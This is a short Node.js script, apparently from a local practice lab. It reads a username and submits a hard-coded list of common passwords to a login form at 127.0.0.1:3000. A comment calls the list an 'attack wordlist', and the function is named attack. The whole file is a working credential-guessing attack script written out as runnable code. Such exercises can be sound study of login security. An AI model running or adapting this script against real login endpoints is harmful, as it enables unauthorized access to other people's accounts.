const axios = require("axios");
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// password list (attack wordlist)
const passwords = ["1234", "password", "admin", "test", "bat1234"];

rl.question("Enter username: ", (username) => {

  async function attack() {
    for (let pass of passwords) {
      try {
        const res = await axios.post(
          "http://127.0.0.1:3000/login",
          `username=${username}&password=${pass}`,
          {
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            }
          }
        );

        console.log(pass, "=>", res.data.replace(/<[^>]*>/g, ""));
      } catch (e) {
        console.log(pass, "=> ERROR:", e.message);
      }
    }

    rl.close();
  }

  attack();
});